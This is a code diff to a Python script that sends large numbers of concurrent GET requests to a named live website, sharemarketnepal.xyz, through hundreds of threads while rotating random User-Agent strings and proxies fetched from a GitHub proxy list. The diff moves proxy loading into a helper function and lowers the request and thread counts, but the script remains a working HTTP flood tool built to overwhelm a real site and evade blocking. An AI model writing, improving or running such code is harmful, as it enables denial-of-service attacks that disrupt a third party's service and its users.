@@ -1,10 +1,32 @@
 import requests
 import random
 from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup
+
+# Function to fetch proxy list from GitHub
+def fetch_proxy_list():
+    try:
+        # URL of the GitHub page containing the proxy list
+        github_url = 'https://github.com/FB-KING/Main-Control/blob/main/proxy.txt'
+        
+        # Fetch the GitHub page content
+        response = requests.get(github_url)
+        if response.status_code == 200:
+            # Parse the HTML content to extract the proxy list
+            soup = BeautifulSoup(response.content, 'html.parser')
+            proxy_list = soup.get_text().strip().split('\n')
+            return proxy_list
+        else:
+            print(f"Failed to fetch proxy list from {github_url}")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred while fetching proxy list: {e}")
+        return None
 
 # Function to send HTTP request with a random User-Agent and proxy
 def send_request(url):
     try:
+        # Define a list of User-Agent strings
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,28 +54,27 @@ def send_request(url):
         # Choose a random User-Agent from the list
         user_agent = random.choice(user_agents)
         
-        
         # Set the User-Agent header
         headers = {"User-Agent": user_agent}
         
-        # Load proxies from the provided URL
-        proxies_url = 'https://github.com/FB-KING/Main-Control/blob/main/proxy.txt'
-        proxies_response = requests.get(proxies_url)
-        proxies_list = proxies_response.text.strip().split('\n')
-        
-        # Choose a random proxy from the list
-        proxy = random.choice(proxies_list)
-        proxies = {"http": proxy, "https": proxy}
-        
-        # Send GET request with the specified User-Agent and proxy
-        response = requests.get(url, headers=headers, proxies=proxies, timeout=5)  # Adjust timeout as needed
-        
-        # Check if the request was successful (status code 200)
-        if response.status_code == 200:
-            print(f"Request to {url} with User-Agent {user_agent} and proxy {proxy} successful")
-            # Process response data if needed
+        # Fetch the proxy list
+        proxies_list = fetch_proxy_list()
+        if proxies_list:
+            # Choose a random proxy from the list
+            proxy = random.choice(proxies_list)
+            proxies = {"http": proxy, "https": proxy}
+            
+            # Send GET request with the specified User-Agent and proxy
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)  # Adjust timeout as needed
+            
+            # Check if the request was successful (status code 200)
+            if response.status_code == 200:
+                print(f"Request to {url} with User-Agent {user_agent} and proxy {proxy} successful")
+                # Process response data if needed
+            else:
+                print(f"Request to {url} with User-Agent {user_agent} and proxy {proxy} failed with status code: {response.status_code}")
         else:
-            print(f"Request to {url} with User-Agent {user_agent} and proxy {proxy} failed with status code: {response.status_code}")
+            print("Failed to fetch proxy list. Skipping request.")
             
     except requests.exceptions.RequestException as e:
         print(f"An error occurred while sending request to {url}: {e}")
@@ -63,10 +84,10 @@ def main():
     url = 'https://sharemarketnepal.xyz'
     
     # Number of times to send the request
-    num_requests = 50000
+    num_requests = 1000
     
     # Maximum number of workers
-    max_workers = 900
+    max_workers = 500
     
     # Create a ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
